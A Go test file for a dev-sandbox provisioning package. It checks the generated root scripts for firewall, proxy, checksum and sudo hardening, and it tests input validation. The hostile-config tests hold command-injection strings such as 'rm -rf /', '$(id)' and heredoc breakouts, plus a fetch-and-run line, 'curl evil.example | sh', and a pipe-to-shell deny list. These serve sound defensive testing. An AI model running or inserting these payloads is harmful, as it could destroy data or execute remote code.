package provision

import (
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/jurajpiar/devkit/internal/project"
)

func params(mod func(*project.Config)) Params {
	c := project.Default()
	c.Name = "test"
	c.Tools.Manager = project.ManagerMise
	c.Tools.Versions = map[string]string{"node": "22", "go": "1.27"}
	if mod != nil {
		mod(c)
	}
	return Params{Config: c, User: "alice", EgressSHA256: "abc123", MountPath: "/Users/alice/proj"}
}

func TestSystemScriptAllowlist(t *testing.T) {
	s, err := System(params(nil))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"MODE=\"allowlist\"",
		"ALLOW_HOST=0",
		"EXTRA_ARGS=-allowed=github.com,",
		`echo "abc123" > /etc/devkit/egress.sha256`,
		`MISE_VERSION="` + MiseVersion + `"`,
		`want="` + MiseArm64SHA + `"`,
		`want="` + MiseAmd64SHA + `"`,
		"https://github.com/jdx/mise/releases/download/${MISE_VERSION}/mise-${MISE_VERSION}-linux-${arch}.tar.xz",
		`if [ "$got" != "$want" ]; then`,
		`install -m 755 -o root -g root "$tmp/mise/bin/mise" /usr/local/bin/mise`,
		`disable_backends = ["asdf", "vfox"]`,
		"paranoid = true",
		`lockfile_platforms = ["linux-arm64", "linux-x64"]`,
		`trusted_config_paths = ["$DEVKIT_HOME/workspace"]`,
		`export PATH="$HOME/.local/share/mise/shims:$PATH"`,
		"--uid-owner devkit-proxy -j ACCEPT",
		"rm -f /etc/sudoers.d/90-cloud-init-users",
		"if ! timeout 5 loginctl list-sessions >/dev/null 2>&1; then",
		"systemctl kill --signal=SIGKILL systemd-logind.service || true",
		`loginctl enable-linger "$DEVKIT_USER" || true`,
		`limablock="$(sed -n '/^#LIMA-START/,/^#LIMA-END/p' /etc/environment)"`,
		`printf '%s\n' "$limablock" >> /etc/environment`,
		"NOPASSWD: DEVKIT_LIMA",
		"/usr/bin/diff -q /run/lima-boot-done /mnt/lima-cidata/meta-data",
		"/usr/bin/diff -q /run/lima-ssh-ready /mnt/lima-cidata/meta-data",
		"/usr/bin/cat /mnt/lima-cidata/param.env",
		`gpasswd -d "$DEVKIT_USER" sudo`,
		`-d "$ip" -p udp --dport 53 $DNS_OWNER -j ACCEPT`,
		`DNS_OWNER="-m owner --uid-owner devkit-proxy"`,
		"DNS=proxy\n",
		"FORWARD=\n",
		`DNS="proxy"`,
		"DNSStubListener=no",
		"ln -sfn /run/systemd/resolve/resolv.conf /etc/resolv.conf",
		"Suites: ${VERSION_CODENAME}-security",
		"$SECAPT full-upgrade -y -q",
		"$SECAPT -o APT::Update::Error-Mode=any update -q",
		"date -u +%s > /var/lib/devkit/.security-updated",
		"sort -V | tail -n1",
		"rm -f /etc/devkit/provision.id",
		"MOUNT_WRITABLE=0\n",
		"kernel.io_uring_disabled = 2",
		"sysctl -q -p /etc/sysctl.d/90-devkit.conf",
		"install af_alg /bin/false",
		"/etc/modprobe.d/devkit-harden.conf",
		"-o Dir::Etc::SourceParts=/dev/null",
		`iptables -A OUTPUT -d "$HOST_IP" -j ACCEPT`,
		`NO_PROXY_HOSTS="localhost,127.0.0.1"`,
		`tmp="$(mktemp /var/lib/devkit/egressproxy.XXXXXX)"`,
		`sha256sum "$tmp"`,
		`-d "$HOST_IP" -j REJECT`,
		"PathExists=/var/lib/devkit/drop/egressproxy",
		"User=devkit-proxy",
		"/usr/local/sbin/devkit-firewall\n",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("system script missing %q", want)
		}
	}
	if strings.Contains(s, "NOPASSWD:ALL") {
		t.Error("full sudo must not be granted by default")
	}
	for _, bad := range []string{"nodesource", "| bash", "| sh", "sha256sum \"$f\"", "releases.nixos.org"} {
		if strings.Contains(s, bad) {
			t.Errorf("system script must not contain %q", bad)
		}
	}
	// Port 53 is only ever opened towards a specific resolver address.
	if strings.Contains(s, "-p udp --dport 53 -j ACCEPT\n") && !strings.Contains(s, `-d "$ip" -p udp --dport 53`) {
		t.Error("DNS rule must be scoped to resolver addresses")
	}
	if strings.Count(s, "--dport 53 $DNS_OWNER -j ACCEPT") != 2 {
		t.Errorf("expected exactly two scoped DNS rules, got %d", strings.Count(s, "--dport 53 $DNS_OWNER -j ACCEPT"))
	}
}

func TestSystemScriptNetworkOptions(t *testing.T) {
	// dns: resolvers reopens DNS to every account; security updates can be
	// switched off; none mode never applies them (no network before the
	// firewall either way, but no pocket to fetch from).
	off := false
	s, _ := System(params(func(c *project.Config) {
		c.Network.DNS = project.DNSResolvers
		c.VM.SecurityUpdates = &off
	}))
	if !strings.Contains(s, "DNS=resolvers\n") || strings.Contains(s, "Suites: ${VERSION_CODENAME}-security") {
		t.Errorf("dns: resolvers and security_updates: false should be reflected:\n%s", s)
	}
	s, _ = System(params(func(c *project.Config) { c.Network.Mode = project.NetworkNone }))
	if strings.Contains(s, "Suites: ${VERSION_CODENAME}-security") {
		t.Error("none mode must not try to fetch security updates")
	}
}

func TestSystemScriptOpenAndSudo(t *testing.T) {
	s, err := System(params(func(c *project.Config) {
		c.Network.Mode = project.NetworkOpen
		c.Network.AllowHost = true
		c.Sudo = true
		c.Tools.Manager = project.ManagerNone
		c.Tools.Versions = nil
		c.Tools.Packages = []string{"postgresql-client", "jq"}
	}))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"MODE=\"open\"",
		"ALLOW_HOST=1",
		"EXTRA_ARGS=-allowed=*",
		"NOPASSWD:ALL",
		`WANT_PKGS="postgresql-client jq"`,
		`NO_PROXY_HOSTS="localhost,127.0.0.1,host.lima.internal"`,
		// open mode still forces everything through the audited proxy
		"allowlist|open)",
		"--uid-owner devkit-proxy -j ACCEPT",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("system script missing %q", want)
		}
	}
	for _, bad := range []string{"MISE_VERSION=", "NIX_VERSION=", "github.com/jdx/mise"} {
		if strings.Contains(s, bad) {
			t.Errorf("manager: none must not install a toolchain manager; found %q", bad)
		}
	}
	if !strings.Contains(s, "rm -f /etc/profile.d/devkit-mise.sh") {
		t.Error("switching away from mise must drop its profile hook")
	}
	if strings.Contains(s, "open) ;;") {
		t.Error("open mode must not leave the OUTPUT chain unrestricted")
	}
}

func TestPolicyFilesAreNotShellExpanded(t *testing.T) {
	s, err := System(params(func(c *project.Config) {
		c.Network.Allow = []string{"registry.npmjs.org"}
	}))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"cat > /etc/devkit/network.conf <<'EOF'\nMODE=allowlist\n",
		"cat > /etc/devkit/egress.conf <<'EOF'\nEXTRA_ARGS=-allowed=registry.npmjs.org\n",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("policy files must be written through quoted heredocs; missing %q", want)
		}
	}
}

func TestSystemScriptTrustStore(t *testing.T) {
	s, err := System(params(func(c *project.Config) {
		c.Network.Distrust = []string{"AAA Certificate Services", "emSign ECC Root CA - G3"}
	}))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		// Distrust is recorded only when this boot flips a root from enabled
		// to disabled, so a distro-disabled root is left to the distro.
		`if grep -q "^mozilla/$f\.crt\$" "$CACONF"; then`,
		`elif grep -q "^!mozilla/$f\.crt\$" "$CACONF"; then`,
		"is already disabled by the distro",
		// The audit skips non-regular files, reads DER, bounds the cache age
		// and exits 2 on a crash rather than 1.
		"if os.path.isfile(path):",
		`["openssl", "x509", "-inform", "DER", "-outform", "PEM"]`,
		"CACHE_FRESH, CACHE_MAX = 86400, 7 * 86400",
		"os._exit(2)",
		// What the sandbox may see of the host, for the probe to judge mounts.
		"cat > /etc/devkit/source.conf <<'EOF'",
		"SOURCE=copy",
		"MOUNT_POINT=\n",

		"$APT install -y -q --only-upgrade ca-certificates",
		"systemctl disable --now apt-daily.timer apt-daily-upgrade.timer unattended-upgrades.service",
		"systemctl mask apt-daily.service apt-daily-upgrade.service",
		"-o DPkg::Lock::Timeout=300",
		"/var/lib/devkit/.distrust",
		`n="AAA Certificate Services"; f="${n// /_}"`,
		`n="emSign ECC Root CA - G3"`,
		"update-ca-certificates --fresh",
		`export NODE_OPTIONS="--use-openssl-ca${NODE_OPTIONS:+ $NODE_OPTIONS}"`,
		"export SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt",
		"cat > /usr/local/bin/devkit-audit <<'PYEOF'\n#!/usr/bin/env python3",
		"\nPYEOF\nchmod 755 /usr/local/bin/devkit-audit",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("system script missing %q", want)
		}
	}
	// The audit script must not terminate its own heredoc early.
	body := s[strings.Index(s, "<<'PYEOF'")+9 : strings.Index(s, "\nPYEOF\n")]
	if strings.Count(s, "\nPYEOF\n") != 1 || strings.Contains(body, "PYEOF") {
		t.Error("audit script heredoc is not intact")
	}
	none, _ := System(params(func(c *project.Config) { c.Network.Mode = project.NetworkNone }))
	if !strings.Contains(none, "if [ \"$MODE\" != \"none\" ]; then\n  ($APT update -q") {
		t.Error("the bundle refresh must be skipped when air-gapped")
	}
}

func TestSystemScriptNone(t *testing.T) {
	s, err := System(params(func(c *project.Config) { c.Network.Mode = project.NetworkNone }))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(s, "MODE=\"none\"") {
		t.Error("missing MODE=none")
	}
}

func TestSystemScriptNix(t *testing.T) {
	s, err := System(params(func(c *project.Config) {
		c.Tools.Manager = project.ManagerNix
		c.Tools.Versions = nil
	}))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		`NIX_VERSION="` + NixVersion + `"`,
		`want="` + NixArm64SHA + `"`,
		`want="` + NixAmd64SHA + `"`,
		"https://releases.nixos.org/nix/nix-${NIX_VERSION}/nix-${NIX_VERSION}-${sys}.tar.xz",
		`echo "devkit: refused Nix ${NIX_VERSION} with hash $got (expected $want)"`,
		`HOME=/root USER=root "$tmp/nix-${NIX_VERSION}-${sys}/install" --daemon --yes --no-channel-add --no-modify-profile`,
		"experimental-features = nix-command flakes",
		"/etc/systemd/system/nix-daemon.service.d/devkit-proxy.conf",
		"Environment=HTTP_PROXY=$PROXY_URL HTTPS_PROXY=$PROXY_URL",
		". /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("nix system script missing %q", want)
		}
	}
	if strings.Contains(s, "MISE_VERSION=") {
		t.Error("nix mode must not install mise")
	}
	// The download must run before the proxy is up and never through it.
	// An array, not a string: a bare * in a string variable would glob.
	if !strings.Contains(s, `"${CURL[@]}" -o "$tmp/nix.tar.xz"`) || !strings.Contains(s, `CURL=(curl -fsSL --noproxy '*' --retry 3 --retry-all-errors --connect-timeout 30 --max-time 900)`) {
		t.Error("nix archive must be fetched directly, like apt during provisioning")
	}
	u, _ := User(params(func(c *project.Config) { c.Tools.Manager = project.ManagerNix; c.Tools.Versions = nil }))
	if strings.Contains(u, "mise") {
		t.Error("nix mode must not write a mise config")
	}
}

func TestUserScript(t *testing.T) {
	s, err := User(params(nil))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(s, `mkdir -p "$HOME/workspace"`) {
		t.Errorf("copy mode should create the workspace: %s", s)
	}
	// Versions are written through a quoted heredoc, sorted, one per line.
	for _, want := range []string{
		`cat > "$HOME/.config/mise/config.toml" <<'EOF'`,
		"lockfile = true",
		"[tools]\ngo = \"1.27\"\nnode = \"22\"\nEOF",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("user script missing %q:\n%s", want, s)
		}
	}
	s, _ = User(params(func(c *project.Config) { c.Source = project.SourceMount }))
	if !strings.Contains(s, `ln -s '/Users/alice/proj' "$HOME/workspace"`) {
		t.Errorf("mount mode should symlink the mount: %s", s)
	}
	sys, _ := System(params(func(c *project.Config) { c.Source = project.SourceMount }))
	if !strings.Contains(sys, "SOURCE=mount\nMOUNT_POINT=/Users/alice/proj\n") {
		t.Errorf("mount mode should record the mount point for the probe: %s", sys)
	}
	// The path is the host's choice: it is one shell word in the user
	// script, and a line break, the only thing that could end the root
	// heredoc early, is refused outright.
	p := params(func(c *project.Config) { c.Source = project.SourceMount })
	p.MountPath = "/Users/alice/it's $(evil) `here`"
	if s, err := User(p); err != nil || !strings.Contains(s, `ln -s '/Users/alice/it'\''s $(evil) `+"`here`'") {
		t.Errorf("mount path should be single-quoted as one word: %v\n%s", err, s)
	}
	for _, brk := range []string{"\n", "\r", "\u0085", "\u2028", "\u2029"} {
		p.MountPath = "/Users/alice/proj" + brk + "EOF" + brk + "rm -rf /"
		if _, err := System(p); err == nil || !strings.Contains(err.Error(), "line break") {
			t.Errorf("a mount path with %q must be refused, got %v", brk, err)
		}
	}
	if _, err := User(p); err == nil {
		t.Error("the user script must refuse it too")
	}
}

// Adversarial: a hostile devkit.yaml tries to reach root through the
// provisioning scripts. Validation is the gate; this checks both that the
// gate holds and that nothing user-controlled is rendered unquoted.
func TestHostileConfigCannotReachRoot(t *testing.T) {
	attacks := []string{
		`22"; rm -rf /; echo "`,
		"22\nEOF\nrm -rf /\ncat <<'EOF'",
		"$(id)", "`id`", "${HOME}", "22 && id", "22;id", "22|id", "22 ", " 22",
	}
	for _, a := range attacks {
		c := project.Default()
		c.Name = "x"
		c.Tools.Manager = project.ManagerMise
		c.Tools.Versions = map[string]string{"node": a}
		if err := c.Validate(); err == nil {
			t.Errorf("version %q should be rejected", a)
		}
		c.Tools.Versions = map[string]string{a: "22"}
		if err := c.Validate(); err == nil {
			t.Errorf("tool name %q should be rejected", a)
		}
		c.Tools.Versions = nil
		c.Tools.Packages = []string{a}
		if err := c.Validate(); err == nil {
			t.Errorf("package %q should be rejected", a)
		}
	}

	// install: is free-form on purpose. It must run as the sandbox user and
	// never appear in either provisioning script, which run as root or at
	// boot before the firewall.
	marker := "curl evil.example | sh"
	sys, _ := System(params(func(c *project.Config) { c.Install = marker }))
	usr, _ := User(params(func(c *project.Config) { c.Install = marker }))
	if strings.Contains(sys, marker) || strings.Contains(usr, marker) {
		t.Error("install: must not be rendered into provisioning scripts")
	}

	// Values that pass validation land in the user config as exactly one
	// TOML line each, inside a quoted heredoc.
	usr, _ = User(params(func(c *project.Config) {
		c.Tools.Versions = map[string]string{"node": "22", "ruby": "3.3.6", "rust": "nightly-2026-01-01"}
	}))
	body := usr[strings.Index(usr, "[tools]"):]
	body = body[:strings.Index(body, "\nEOF")]
	want := "[tools]\nnode = \"22\"\nruby = \"3.3.6\"\nrust = \"nightly-2026-01-01\""
	if body != want {
		t.Errorf("tools block = %q, want %q", body, want)
	}
	if strings.Count(usr, "\nEOF\n") != 1 {
		t.Errorf("exactly one heredoc terminator expected in the user script:\n%s", usr)
	}
}

// TestEnvironmentEditsAreIdempotent runs the /etc/environment fragment of the
// system script twice, with proxy entries inside Lima's block, and checks that
// the second run changes nothing and the block comes through untouched and
// last. Lima terminates the user's sessions whenever the file differs after its
// own rewrite, so any drift here re-arms the logind stall on every boot.
func TestEnvironmentEditsAreIdempotent(t *testing.T) {
	sed := "sed"
	if runtime.GOOS == "darwin" {
		sed = "gsed"
	}
	if _, err := exec.LookPath(sed); err != nil {
		t.Skipf("needs GNU sed (%s)", sed)
	}
	limaBlock := "#LIMA-START\nHTTP_PROXY=http://host.proxy:3128\nhttp_proxy=http://host.proxy:3128\nPATH=/usr/bin\n#LIMA-END\n"
	for _, mode := range []string{project.NetworkAllowlist, project.NetworkNone} {
		t.Run(mode, func(t *testing.T) {
			s, err := System(params(func(c *project.Config) { c.Network.Mode = mode }))
			if err != nil {
				t.Fatal(err)
			}
			start := strings.Index(s, "# Runtimes that carry their own root list")
			end := strings.Index(s[start:], "printf '%s\\n' \"$limablock\" >> /etc/environment\nfi\n")
			if start < 0 || end < 0 {
				t.Fatal("environment fragment not found")
			}
			frag := s[start : start+end+len("printf '%s\\n' \"$limablock\" >> /etc/environment\nfi\n")]
			dir := t.TempDir()
			env := filepath.Join(dir, "environment")
			// Quoted: TMPDIR may hold spaces or shell metacharacters.
			q := func(p string) string { return "'" + strings.ReplaceAll(p, "'", `'\''`) + "'" }
			frag = strings.ReplaceAll(frag, "/etc/environment", q(env))
			frag = strings.ReplaceAll(frag, "/etc/profile.d", q(dir))
			frag = strings.ReplaceAll(frag, "/etc/apt/apt.conf.d", q(dir))
			frag = strings.ReplaceAll(frag, "/usr/local/bin", q(dir))
			frag = strings.ReplaceAll(frag, "sed -i", sed+" -i")
			frag = strings.ReplaceAll(frag, "id devkit-proxy >/dev/null 2>&1 || useradd", "true || useradd")
			script := "set -eu\nstep() { :; }\nMODE=" + mode + "\n" + frag
			if err := os.WriteFile(env, []byte("LANG=C\n"+limaBlock+"STALE=1\nHTTP_PROXY=http://old:1\n"), 0o644); err != nil {
				t.Fatal(err)
			}
			run := func() string {
				out, err := exec.Command("bash", "-c", script).CombinedOutput()
				if err != nil {
					t.Fatalf("fragment failed: %v\n%s", err, out)
				}
				b, err := os.ReadFile(env)
				if err != nil {
					t.Fatal(err)
				}
				return string(b)
			}
			first := run()
			second := run()
			if first != second {
				t.Errorf("second run changed the file:\n--- first\n%s--- second\n%s", first, second)
			}
			if !strings.HasSuffix(first, limaBlock) {
				t.Errorf("Lima block not last or altered:\n%s", first)
			}
			if strings.Contains(strings.TrimSuffix(first, limaBlock), "http://old:1") {
				t.Errorf("stale proxy line outside the block survived:\n%s", first)
			}
			if mode == project.NetworkAllowlist && !strings.Contains(first, "HTTPS_PROXY=http://127.0.0.1:3128\n") {
				t.Errorf("devkit proxy line missing:\n%s", first)
			}
		})
	}
}

func TestResolutionIsSetBeforeFirewall(t *testing.T) {
	s, _ := System(params(nil))
	link := strings.Index(s, "ln -sfn /run/systemd/resolve/resolv.conf /etc/resolv.conf")
	fw := strings.Index(s, "/usr/local/sbin/devkit-firewall\n")
	if !(link > 0 && link < fw) {
		t.Errorf("libc must point at the upstream resolvers before the firewall: link=%d fw=%d", link, fw)
	}
	if strings.Contains(s, "for the duration of provisioning") {
		t.Error("the stub must no longer be re-enabled at the start of a boot")
	}
}

func TestFingerprintStableAndPolicySensitive(t *testing.T) {
	base := params(nil)
	a, err := Fingerprint(base)
	if err != nil || a == "" {
		t.Fatalf("fingerprint: %v", err)
	}
	// Stable for identical policy, and independent of the host mount path.
	b := params(nil)
	b.MountPath = "/somewhere/else"
	if got, _ := Fingerprint(b); got != a {
		t.Errorf("fingerprint should ignore MountPath: %s vs %s", a, got)
	}
	// Changes when policy changes.
	for _, mod := range []func(*project.Config){
		func(c *project.Config) { c.Network.Mode = project.NetworkOpen },
		func(c *project.Config) { c.Network.DNS = project.DNSResolvers },
		func(c *project.Config) { c.Network.Allow = append(c.Network.Allow, "example.com:8443") },
		func(c *project.Config) { c.Network.Forward = []int{3000} },
		func(c *project.Config) { c.Source = project.SourceMount; c.MountWritable = true },
	} {
		p := params(mod)
		if got, _ := Fingerprint(p); got == a {
			t.Error("fingerprint should change when policy changes")
		}
	}
	// Changes when the proxy binary hash changes.
	c := params(nil)
	c.EgressSHA256 = "deadbeefdeadbeef"
	if got, _ := Fingerprint(c); got == a {
		t.Error("fingerprint should change with the proxy hash")
	}
}

func TestStampIsPublishedLast(t *testing.T) {
	s, _ := System(params(nil))
	rm := strings.Index(s, "rm -f /etc/devkit/provision.id")
	fw := strings.Index(s, "/usr/local/sbin/devkit-firewall\n")
	stamp := strings.Index(s, "> /etc/devkit/provision.id")
	done := strings.Index(s, "provisioning done")
	if !(rm > 0 && rm < fw && fw < stamp && stamp < done) {
		t.Errorf("stamp must be removed first and written only after the firewall, just before done: rm=%d fw=%d stamp=%d done=%d", rm, fw, stamp, done)
	}
}

func TestProgressSteps(t *testing.T) {
	s, _ := System(params(nil))
	for _, want := range []string{
		"step() { printf 'devkit-progress: %s\\n' \"$*\" > /dev/hvc0 2>/dev/null || true; }",
		`step "applying Ubuntu security updates (can take a minute)"`,
		`step "applying the firewall"`,
		"step \"done\"\necho \"devkit: provisioning done",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("system script missing %q", want)
		}
	}
	// Steps must appear in the order they run.
	if strings.Index(s, `step "provisioning started"`) > strings.Index(s, `step "applying the firewall"`) {
		t.Error("progress steps out of order")
	}
}

func TestBootHold(t *testing.T) {
	s, _ := System(params(nil))
	for _, want := range []string{
		`SANDBOX_UID="$(id -u "$DEVKIT_USER")"`,
		"-m owner --uid-owner \\$who -j REJECT",
		"-m owner --uid-owner $RESOLVE_UID -j REJECT",
		"Before=network-pre.target ssh.socket ssh.service cloud-init-local.service sysinit.target",
		"systemctl enable devkit-boot-hold.service",
		"$t -P OUTPUT DROP",
		"date +%s > /run/devkit/firewall-at",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("system script missing %q", want)
		}
	}
	// The firewall must go back to an ACCEPT policy only after its final REJECT.
	if strings.Index(s, "iptables -A OUTPUT -j REJECT") > strings.Index(s, "$t -P OUTPUT ACCEPT 2>/dev/null || true; done") {
		t.Error("policy restored before the final REJECT")
	}
}

func TestBootHoldDoesNotOpenLoopbackForTheSandbox(t *testing.T) {
	s, _ := System(params(nil))
	hold := s[strings.Index(s, "cat > /usr/local/sbin/devkit-boot-hold"):]
	hold = hold[:strings.Index(hold, "\nEOF\n")]
	if strings.Contains(hold, "-o lo -j ACCEPT") {
		t.Error("the boot hold must not accept loopback ahead of the sandbox user's REJECT")
	}
}

func TestStateIsTrustedOnlyForRootAndProxy(t *testing.T) {
	s, _ := System(params(nil))
	fw := s[strings.Index(s, "cat > /usr/local/sbin/devkit-firewall"):]
	fw = fw[:strings.Index(fw, "\nEOF\n")]
	if strings.Contains(fw, "-A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT") {
		t.Error("the firewall must not accept established traffic regardless of owner")
	}
	for _, want := range []string{
		"-m owner --uid-owner 0 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT",
		"-m owner --uid-owner devkit-proxy -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT",
		"-m conntrack --ctdir REPLY -j ACCEPT",
	} {
		if !strings.Contains(fw, want) {
			t.Errorf("firewall missing %q", want)
		}
	}
	hold := s[strings.Index(s, "cat > /usr/local/sbin/devkit-boot-hold"):]
	hold = hold[:strings.Index(hold, "\nEOF\n")]
	if strings.Contains(hold, "--ctstate ESTABLISHED") {
		t.Error("the boot hold must not accept by connection state")
	}
	if !strings.Contains(hold, "for who in $SANDBOX_UID $SUBUIDS") {
		t.Error("the boot hold must also hold the sandbox's subordinate UIDs")
	}
}
